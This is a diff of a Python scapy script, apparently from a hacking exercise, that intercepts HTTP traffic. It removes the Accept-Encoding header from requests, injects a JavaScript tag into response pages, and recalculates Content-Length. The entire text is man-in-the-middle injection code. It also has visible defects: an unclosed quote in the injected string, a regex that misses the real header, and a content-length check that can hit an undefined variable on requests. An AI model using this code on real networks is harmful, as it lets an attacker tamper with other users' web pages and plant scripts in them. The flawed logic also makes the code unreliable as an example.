@@ -21,27 +21,28 @@ def set_load(packet,load):
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())   #converting into scapy packet
     if scapy_packet.haslayer(scapy.Raw):   #checking for HTTP layer
+       load = scapy_packet[scapy.Raw].load
 
        if scapy_packet[scapy.TCP].dport == 80:  #HTTP requests
           
           print("[+]requests")
-          modified_load = re.sub("Accept-encoding=.*?\\r\\n"," ",scapy_packet[scapy.Raw].load)
-          new_packet = set_load(scapy_packet,modified_load)
-          packet.set_payload(str(new_packet))
+          load = re.sub("Accept-encoding=.*?\\r\\n"," ",load)   # removing accept encoding using regex
+          
 
        elif scapy_packet[scapy.TCP].sport == 80:   #HTTP responses
           print("[+]responses")
           injection_code = "<script>alert('test)</script>"
-          modified_load = scapy_packet[scapy.Raw].load.replace("</body",injection_code + "</body>")
-          content_length_search = re.search("(?:Content-Length:\s)(\d*)",scapy_packet[scapy.Raw].load)
+          load = load.replace("</body",injection_code + "</body>")   # injecting javascript
+          content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)    # searching for content length using regex
 
-          if content_length_search:
-             content_length = content_length_search.group(1)
-             new_content_length = int(content_length)+len(injection_code)
-             print(content_length)
+       if content_length_search:
+          content_length = content_length_search.group(1)
+          new_content_length = int(content_length)+len(injection_code)    # recalculating the content length
+          load = load.replace(content_length, str(new_content_length))
 
-          new_packet = set_load(scapy_packet,modified_load)
-          packet.set_payload(str(new_packet))
+       if load!=scapy_packet[scapy.Raw].load:
+           new_packet = set_load(scapy_packet,load)
+           packet.set_payload(str(new_packet))
 
 
     packet.accept()  #to forward the packets
